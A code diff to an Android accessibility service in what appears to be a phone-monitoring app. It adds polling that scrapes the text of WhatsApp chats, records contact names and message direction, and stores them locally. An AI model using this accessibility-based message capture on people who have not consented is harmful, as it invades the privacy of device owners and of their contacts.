@@ -1,13 +1,16 @@
 package com.spapp.monitoring.blocking
 
 import android.accessibilityservice.AccessibilityService
+import android.graphics.Rect
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WebHistoryEntry
+import com.spapp.monitoring.data.local.WhatsAppMessageEntry
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -99,7 +102,100 @@ class BlockAccessibilityService : AccessibilityService() {
             stopBrowserPolling()
         }
 
+        if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
+            startWhatsAppPolling()
+        } else {
+            stopWhatsAppPolling()
+        }
+
         checkAppRule(packageName)
+    }
+
+    /**
+     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
+     */
+    private var whatsAppPollRunnable: Runnable? = null
+    private val whatsAppPollIntervalMs = 2000L
+    private val capturedWhatsAppMsgHashes = mutableSetOf<String>()
+
+    private fun startWhatsAppPolling() {
+        if (whatsAppPollRunnable != null) return
+        val runnable = object : Runnable {
+            override fun run() {
+                recordWhatsAppChatIfForeground(rootInActiveWindow)
+                pollHandler.postDelayed(this, whatsAppPollIntervalMs)
+            }
+        }
+        whatsAppPollRunnable = runnable
+        pollHandler.postDelayed(runnable, 500L)
+    }
+
+    private fun stopWhatsAppPolling() {
+        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
+        whatsAppPollRunnable = null
+    }
+
+    private fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
+        if (root == null) return
+        try {
+            var chatTitle: String? = null
+            val titleNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name")
+            if (!titleNodes.isNullOrEmpty()) {
+                chatTitle = titleNodes[0].text?.toString()?.trim()
+            }
+            if (chatTitle.isNullOrBlank()) {
+                val abNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/action_bar_title")
+                if (!abNodes.isNullOrEmpty()) {
+                    chatTitle = abNodes[0].text?.toString()?.trim()
+                }
+            }
+            if (chatTitle.isNullOrBlank()) return
+
+            val displayMetrics = resources.displayMetrics
+            val screenWidth = displayMetrics.widthPixels
+
+            val messageNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text")
+            if (messageNodes.isNullOrEmpty()) return
+
+            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
+            val now = System.currentTimeMillis()
+
+            for (node in messageNodes) {
+                val text = node.text?.toString()?.trim() ?: continue
+                if (text.isBlank()) continue
+
+                val rect = Rect()
+                node.getBoundsInScreen(rect)
+                val isOutgoing = rect.centerX() > (screenWidth / 2)
+
+                val dedupeKey = "$chatTitle|$text|$isOutgoing"
+                if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
+                capturedWhatsAppMsgHashes.add(dedupeKey)
+                if (capturedWhatsAppMsgHashes.size > 2000) {
+                    capturedWhatsAppMsgHashes.clear()
+                }
+
+                entriesToInsert += WhatsAppMessageEntry(
+                    chatName = chatTitle,
+                    sender = if (isOutgoing) "me" else chatTitle,
+                    messageText = text,
+                    isOutgoing = isOutgoing,
+                    messageTimeEpochMs = now
+                )
+            }
+
+            if (entriesToInsert.isNotEmpty()) {
+                scope.launch {
+                    try {
+                        val db = AppDatabase.getInstance(applicationContext)
+                        db.whatsAppMessageDao().insertAll(entriesToInsert)
+                    } catch (e: Exception) {
+                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
+                    }
+                }
+            }
+        } catch (_: Exception) {
+        }
     }
 
     /**
